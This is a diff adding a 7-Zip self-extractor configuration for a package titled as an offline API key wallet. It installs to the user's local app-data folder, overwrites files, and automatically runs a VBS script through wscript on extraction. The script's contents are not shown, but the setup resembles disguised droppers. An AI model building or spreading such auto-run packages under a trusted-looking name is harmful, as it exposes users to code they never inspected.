@@ -1,0 +1,6 @@
+;!@Install@!UTF-8!
+Title="Wallet - Offline API Key Vault"
+InstallPath="%LOCALAPPDATA%\\Wallet"
+RunProgram="wscript.exe launch.vbs"
+OverwriteMode="2"
+;!@InstallEnd@!
